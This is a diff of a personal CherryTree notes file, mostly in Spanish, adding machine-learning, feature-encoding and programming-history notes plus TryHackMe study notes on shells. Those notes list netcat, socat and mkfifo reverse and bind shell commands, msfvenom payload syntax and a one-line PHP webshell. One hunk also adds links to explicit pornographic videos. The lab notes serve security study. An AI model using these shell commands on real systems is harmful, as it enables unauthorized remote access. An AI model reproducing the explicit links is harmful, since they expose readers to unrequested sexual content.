@@ -5647,7 +5647,7 @@ Subpantillas (patials)
 - se invocan con {{- template “nombre plantilla” }}
 - {{- template “nombre plantilla” . }} se agrega el punto para poder usar los valores a ejecutar, contexto, el unto es un contexto, se pueden poner otros</rich_text>
     </node>
-    <node name="os" unique_id="136" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1676838307" ts_lastsave="1698087959">
+    <node name="os" unique_id="136" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1676838307" ts_lastsave="1699212304">
       <rich_text>Introduction
 - combination of hardware, software and data used to solve problems
 - level of important
@@ -6186,6 +6186,9 @@ amateur-channels/polysweet
       <rich_text>
 </rich_text>
       <rich_text link="webs https://www.xvideos.com/channels/big_ass_teens1#_tabVideos">https://www.xvideos.com/channels/big_ass_teens1#_tabVideos</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text link="webs https://www.xvideos.com/video76510781/step_sister_moves_her_thick_ass_seducing_me_to_ride_my_dick">https://www.xvideos.com/video76510781/step_sister_moves_her_thick_ass_seducing_me_to_ride_my_dick</rich_text>
       <rich_text>
 
 
@@ -6957,7 +6960,7 @@ basic terms
     </node>
     <node name="Servidores web" unique_id="176" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694987488" ts_lastsave="1694987488"/>
   </node>
-  <node name="TryHackMe" unique_id="149" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939072" ts_lastsave="1696906198">
+  <node name="TryHackMe" unique_id="149" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939072" ts_lastsave="1698636581">
     <node name="Pyramid of pain" unique_id="150" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939081" ts_lastsave="1685940575">
       <rich_text>6 levels:
 - Hash Values (Trivial)
@@ -8128,6 +8131,109 @@ API SECURITY -------
       <rich_text>Scan and learn what exploit this machine is vulnerable to</rich_text>
     </node>
     <node name="NMAP" unique_id="182" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696303602" ts_lastsave="1696303602"/>
+    <node name="Shells" unique_id="188" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1698636581" ts_lastsave="1699293931">
+      <rich_text>shell is used with CLI, bash and sh are examples of shell
+
+Tools:
+- netcat, swiss army knife to network
+- socat, netcat with steroids
+   → the syntax is more difficult
+   → nc is more common that socat
+- Metasploit - multi/handler, is a module of metasploit
+- Msfvenom, part of metasploit framework, used to generate payloads on the fly
+
+
+Used URLS:
+- </rich_text>
+      <rich_text link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</rich_text>
+      <rich_text>
+- </rich_text>
+      <rich_text link="webs https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</rich_text>
+      <rich_text>
+- </rich_text>
+      <rich_text link="webs https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</rich_text>
+      <rich_text>
+
+Shells:
+- reverse shells, execute code that connects back to your computer, goods for bypass firewalls rules
+- bind shells, code executed on the target is used to start a listener attached to a shell directly on the target, protected using firewalls
+
+Netcat
+- basic tool in pentester
+- used to reverse shels: nc -lvnp {port}
+   → l is listener
+   → v is verbose output
+   → n not to resolve host name or use DNS
+   → p indicates port
+- common ports used 80, 443 and 53
+
+Netcat shell stabilisation
+- technique 1: python
+   → python -c ‘import pty;pty.spawn("/bin/bash")’, with python 2 or 3
+   → export TERM=xterm
+   → stty raw -echo; fg
+- technique 2: rlwrap, program that gives access to history, tab autocompletion
+   → use: rlwrap nc -lvnp {port}
+   → this techniques is used with windows
+- technique 3: socat
+   → python -m http.server 80
+
+Socat
+- similar to netcat
+- reverse shells
+   → socat TCP -L:{port} -
+   → win: socat TCP:{local ip}:{local port} EXEC:powershell.exe, pipes
+- bind shells
+   → socat TCP-L:{port} EXEC:"bash -li"
+- more stable reverse shell: socat TCP-L:{port} FILE:`tty`,raw,echo=0
+
+Socat encrypted shells
+- this is capable of create encrypted shells
+- steps
+   → openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt, to create certificate
+   → cat shell.key shell.crt &gt; shell.pem, to create .pem
+   → socat OPENSSL -LISTEN:{port},cert=shell.pem,verify=0 -, to reverse shell listener
+   → socat OPENSSL:{local ip}:{local port},verify=0 EXEC:/bin/bash
+- to bind shell
+   → socat OPENSSL-LISTEN:{port},cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
+   → socat OPENSSL:{target ip}:{target port},verify=0 -
+
+Common shell payloads
+- use of msfvenom
+- nc -lvpn {port} -e {command}, with -e is possible execute a command, this is a netcat-tradicional
+- mkfifo /tmp/f; nc -lvpn {port} &lt; /tmp/f | /bin/sh &gt; /tmp/f 2&gt;&amp;1;rm /tmp/f, this create a named pie, and connect the nc to named pipe, and is used input, output and errput in the named pipe, this is a bind shell
+- with reverse shell: mkfifo /tmp/f; nc {local ip} {port} &lt; /tmp/f | /bin/sh &gt; /tmp/f 2&gt;&amp;1; rm /tmp/f
+
+msfvenom
+- used to generate code for primarily reverse and bind shell
+- used in lover-level exploit
+- create payloads in various formats, exe, aspx, war, py
+- syntax: msfvenom -p {payload} {options}
+- example: msfvenom -p windows/x64/shell/reverse_ftp -f exe -o shell.exe LHOST={liste ip} LPORT={listen port}
+- type of payloads
+   → staged, payloads are sent in 2 parts, the first is stager, waiting connections, but does not contains reverse shell, this does not touch the disk, metasploit is added before
+   → stageless, more common, self-contained
+- meterpreter, metasploit's own brand of fully-featured shell, completely stable to work with windows target
+- payload naming conventions
+   → {OS}/{arch}/{payload}
+   → {OS}/{payload}, to windows 32
+   → stageless are denoted with underscore
+   → windows/x64/meterpeter/reverse_tcp to use meterpreter
+
+Metasploit multi/handler
+- milti/handler is a superb tool for catching reverse shells
+- commands:
+   → set PAYLOAD {payload}
+   → set LHOST {listen address}
+   → set LPORT {listen port}
+- to launch: exploit -j, this is necesary sudo permissions
+- session {id} to foreground
+
+Webshell
+- exists web servers with opportunities to use like webshells, common with PHP or ASP
+- basic webshell: &lt;?php echo “&lt;pre&gt;” . shell_exec($_GET["cmd"]) . “&lt;/pre&gt;”; ?&gt;
+- </rich_text>
+    </node>
   </node>
   <node name="English" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1624747640" ts_lastsave="1685941303">
     <node name="Descriptions" unique_id="33" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1624747655" ts_lastsave="1625432347">
@@ -12665,7 +12771,7 @@ Analisis Bivariado
 Paradoja de simpson
 - es un fenomeno en el cual se pueden concluir dos cosas totalmente opuestas a partir de los mismos datos, dependiendo el como se clasifican estos</rich_text>
     </node>
-    <node name="machine learning curso udemy" unique_id="113" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1664229102" ts_lastsave="1697509064">
+    <node name="machine learning curso udemy" unique_id="113" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1664229102" ts_lastsave="1698801932">
       <rich_text>p = t</rich_text>
       <node name="que es el machine learning" unique_id="114" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1664229117" ts_lastsave="1664739247">
         <rich_text>es un subdominio de la IA, proporciona a los sistemas la capacidad de aprender y mejorar automaticamente, sin ser programados para ellos, es generalmente crear un modelo que se va mejorando con mas datos hacia el modelo a lo largo del tiempo (experiencia en datos)
@@ -12757,6 +12863,47 @@ Regresion Logistica
 - funcion de optimizacion
    → se usa la misma para la regresion lineal, gradiente descendiente</rich_text>
       </node>
+      <node name="Creacion de proyectos" unique_id="190" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698801932" ts_lastsave="1699575193">
+        <rich_text>el conjunto de datos es una parte esencial en la resolucion de un problema, al nivel del algoritmo a usarse
+disponer de una cantidad suficiente de datos
+esencial utilizar un conjunto de datos que es representativo del problema practico
+los datos deben ser de calidad
+debe seleccionarse un conjunto de caracteristicas adecuado, minimizando el numero de caracteristicas irrelevantes
+
+las correlaciones ayudan para saber que la variable que modifica la salida pueden tomarse para usar con el modelo, es significativo
+correlacion entre diferentes caracteriscas que e comportan igual, se pueden eliminar, ya que representan practicamente lo mismo
+
+evitar overfitting y underfitting
+separacion por subconjuntos, entrenar, validar y probar
+overfitting, se ajusta demasiado bien al conjunto de datos de entrenamiento, aumentando el conjunto de datos si es posible, reduccion del numero de caracteristicas, utilizar algoritmos para la seleccion y extraccion de caracteristicas, regularizar
+underfitting, cuando los datos fallan mucho, para resolver este se debe seleccionar otro tipo de modelo mas complejo y con mas flexibilidad
+
+evaluacion de la hipotesis
+se requiere de una forma de evaluar la funcion hipotesis
+una o dos caracteristicas se puede representar graficamente
+pero con mas caracteristicas
+para evitar overfitting se usa un dataset que es de test el cual no conoce el modelo
+
+seleccion del modelo
+
+Preparacion del conjunto de datos
+- valores perdidos, el dataset puede tener valores perdidos en una determinada caracteristica
+   → se pueden eliminar el ejemplo del conjunto de datos
+   → eliminar la caracteristica
+   → asignar un valor determinado
+- valores categoricos, representaciones de texto, estos deben de cambiarse a valores numericos
+   → lo mas comun es usar encoding
+- escalado y estandarizado de caracteristicas
+   → diferentes escalas o valores muy impares
+   → escalar es usar valores entre 0 y 1
+   → se calcula restando el valor minimo y dividiendo por el maximo menos el minimo
+   → en la estandarizacion se busca tener una media de cero y una desviacion estandar de uno
+- desequilibrio de datos
+   → datos con pocos datos positivos y muchos negativos
+   → hacer oversample
+   → seleccionar un subconjunto
+   → modificar la funcion de error, para que la minoria tenga mas influencia en el modelo</rich_text>
+      </node>
     </node>
     <node name="data eng zoomcamp" unique_id="135" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1674689635" ts_lastsave="1675719767">
       <rich_text>--iidfile string
@@ -12771,7 +12918,7 @@ Long Island City/Queens Plaza
 </rich_text>
       <rich_text family="monospace">0 5 1 * *</rich_text>
     </node>
-    <node name="ingenieria de variables" unique_id="185" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1697502469" ts_lastsave="1698190507">
+    <node name="ingenieria de variables" unique_id="185" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1697502469" ts_lastsave="1699585817">
       <rich_text># Tipos de variables
 - cualquier caracteristica, numero o cantidad que puede ser medida o contada
 - se pueden clasificar en dos:
@@ -12955,7 +13102,97 @@ Datos faltantes
    → limitaciones
       ⇒ retorna un arrray en lugar de un dataframe
       ⇒ necesita clases adicionales para seleccionar cuales variables sustituir
-      ⇒ no es tan sencillo de usar</rich_text>
+      ⇒ no es tan sencillo de usar
+   → se usa columntransformer
+   → para reemplazo valor arbitrario se usa strategy='constant', fill_value={valor}
+
+Feature engine - lib
+- incluye todas las tecnicas de imputacion
+- funcion como sklearn
+- permite implementar en un grupo selecto de variables
+- puede ser integrado con los Pipelines de sklearn
+
+Codificacion de variables categoricas
+- proceso de reemplazar etiquetas por una representacion numerica
+- producir varibles para ML
+- construir variables predictivas
+- relacion monotonica
+   → cuando la variable incrementa, incrementa el valor del target
+   → cuando la variable incrementa, el valor del target decrece
+   → mejoran el desenpeno en modelos lineales, tambien en arboles de decision
+   → se prefiera incluir restricciones monotonicas
+   → para las etiquetas raras se usa one hot para categorias mas fecuentes y agrupacion de las poco frecuentes
+- codificacion one hot:
+   → cada categoria es reemplazada con una varible binaria tambien llamada dummy
+   → la variable toma el valor 1 o 0, si la categoria esta presente
+   → tambien puede hacerse con k - 1 variables
+   → con binarias se usa una variable binaria
+   → ayuda a reducir por una dimension con k-1
+   → a veces es mejor usar k variables, por ejemplo con arboles, seleccion de variables de forma recursiva, cuando se quiere saber la importancia de cada una de las categorias de los datos
+   → ventajas
+      ⇒ no asume o impone condiciones en la distribucion de la variable o de las categorias
+      ⇒ mantiene toda la informacion
+      ⇒ es apropiada para modelos lineales
+   → limitaciones
+      ⇒ incrementa el dataset
+      ⇒ no añade informacion adicional
+      ⇒ muchas variables dummy pueden ser identicas
+- codificacion de categorias mas frecuentes
+   → crear dummies pra cateorias mas frecuentes
+   → ventajas
+      ⇒ facil de implementar
+      ⇒ no requiere horas en la exploracion
+      ⇒ no genera numero extremadamente alto de nuevas variables
+      ⇒ adecuado para modelos lineales
+   → limitaciones
+      ⇒ genera nuevas variables
+      ⇒ no retiene informacion adicional de las etiquetas ignoradas
+      ⇒ se hace un count group by oreder by limit para obtener los datos... en lenguaje SQL
+- Codificacion ordinal
+   → reemplazo de una categotia por digitos o numeros enteros del 1 a n o de 0 a n - 1
+   → los numeros se asignan arbitrareamente
+   → permite rapuda evaluacion comparativa en los modelos de ML
+   → facil de implementar
+   → no genera ams variables
+   → puede funcionar con arboles de decision
+   → no anade orden arbitrario
+   → no es bueno para modelos lineales
+   → no maneja nuevas categorias
+- codificacion con frecuencias o cuentas
+   → se reemplaza por el numero o porcentaje de observaciones
+   → captura la representacion de cada etiqueta
+   → metodo popular en kaggle
+   → supuesto: el numero de observaciones de cada categoria predice el valor del target o vaiable objetivo
+   → facil de implementar
+   → no genera variables
+   → funciona bien con arboles
+   → no sirve para modelos lineales
+   → no maneja categorias adicionales
+   → si dos categorias aparecen iguales en cantidad se puede perder informacion
+- Codificacion guiada por la variable objetivo
+   → guiadas por la variable objetivo
+   → crean relacion monotica entre variable y target
+   → ordena las categorias de acuerdo al targetr
+   → numero de 1 a k, k es el numero de vategorias distintas en la variable
+   → enumeracion guiada por el valor promedio del target
+   → facil de implementar
+   → no genera multiples variables
+   → crea una relacion monotonica entre las vategorias y el target
+   → puede causar sobreajustes
+   → dificil de implementar con validacion cruzada
+- Codificacion con la media del target
+   → se reemplaza la categoria con el valor medio del target
+   → facil de implementar
+   → no genera multiples variables
+   → crea una relacion monotonica
+   → puede causar sobreajustes
+   → dificil de implmentar con vlidacion cruzada
+   → si 2 tienen el mismo promedio del target se pierde informacion
+- Codificacion con proporcion de probabilidades
+   → proporcion de la probabilidad de que el target sea 1 o 0, este solo usa cuando es binario
+- Peso de la evidencia
+   → evaluacion de datos o informacion
+   → evaluacion de incumplimientos de pago de prestamos p deudas</rich_text>
     </node>
   </node>
   <node name="JS" unique_id="26" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625688385" ts_lastsave="1630594410">
@@ -13586,7 +13823,7 @@ Tipos de funciones
 - </rich_text>
     </node>
   </node>
-  <node name="Nuevos lenguajes" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1617842349" ts_lastsave="1698026179">
+  <node name="Nuevos lenguajes" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1617842349" ts_lastsave="1698688730">
     <node name="Algoritmos y pensamiento logico" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1617842365" ts_lastsave="1641884633">
       <rich_text>en python con () se hace un generator expresion que es como una lista pero mas potente, ocupa menos memoria
 
@@ -14435,7 +14672,7 @@ CH:
 - formula for index: A[i] = Base Address + i * datasize
    → in C the formula is pointer</rich_text>
     </node>
-    <node name="Rust" unique_id="187" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1698026179" ts_lastsave="1698089223">
+    <node name="Rust" unique_id="187" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="40" is_bold="0" foreground="" ts_creation="1698026179" ts_lastsave="1698690008">
       <rich_text>por que usar:
 - lenguaje mas amado por la comunidad
 - modo seguro, evita hacer codigo inseguro o feo
@@ -14463,6 +14700,68 @@ CH:
 - for se usa `for i in 0..3 {}` con variables: `for {var} in {array} {}`
 - vectores inmutables: `let {vector} = [{valores}]`, este no se pude modificar
 - para crear una funcion: `fn {nombre}({variables con tipo})`</rich_text>
+    </node>
+    <node name="Historia de los langs" unique_id="189" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1698688730" ts_lastsave="1699155613">
+      <rich_text>las maquinas abstractas tienen:
+- procesar datos primitivos
+- controlar secuencias de ejecucion de operaciones
+- controlar transferencia de datos
+- manejo de memoria
+
+ciclo de ejecucion:
+- inicio
+- trae instrucciones
+- decodifica
+- trae operando
+- elige que ejecutar
+- se guarda el estado si es que existen muchas operaciones
+- terminando las operaciones finaliza
+
+niveles de descripcion:
+- gramatica
+   → que oraciones son las correctas
+   → secuencia de tokens
+   → frases del lenguaje propio
+- semantica
+   → que significa una oracion correcta
+- pragmatica
+   → como usamos una oracion significativa, que quiere decir
+- implementacion
+
+imperativo, dice que va a hacer y como se va a hacer
+declarativo, se enfoca en el resultado, no importa tanto el como
+
+funcional tambien es declarativo, es complejo de aprende y analizar
+se basa en funciones matematicas
+primera clase, reconocidas para utilizarse como cualquier tipo de dato, se pueden llamar desde cualquier lado
+orden superior, toma una o mas funciones como parametro, retorna una funcion como salida
+funciones puras, son deterministicas, un valor de entrada da uno de salida, no genera efectos secundarios, no incluye funciones impuras, el resultado siempre es el mismo
+funciones lambda, anonima, comportamiento de uso unico, contexto especifico o corto tiempo, simplicidad
+efectos secundarios, estado de la aplicacion, valores en datos, modificacion de archivos, hasta llamado de un servidor
+
+prog logica, NLP, recuperacion en BBDD, aplicaciones matematicas
+	se basa en las clausulas de Horn
+	
+concurrencia un recurso, paralelismo varios recursos
+estados de hilos:
+	creado
+	ejecutable/listo
+	ejecutando
+	bloqueado
+	terminado
+	
+	
+</rich_text>
+      <rich_text scale="h3" foreground="#eff3f8">Qué es la máquina abstracta?</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text scale="h3" foreground="#eff3f8">QuĆ© problema de la programaciĆ³n secuencial buscaba resolver el paradigma estructurado?</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text scale="h3" foreground="#eff3f8">En qué situación del mundo real podemos apreciar un caso de concurrencia?</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text scale="h3" foreground="#eff3f8">Qué lenguaje introdujo el concepto de "código intermedio"?</rich_text>
     </node>
   </node>
   <node name="Crecimiento personal" unique_id="45" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1617947184" ts_lastsave="1684703124">
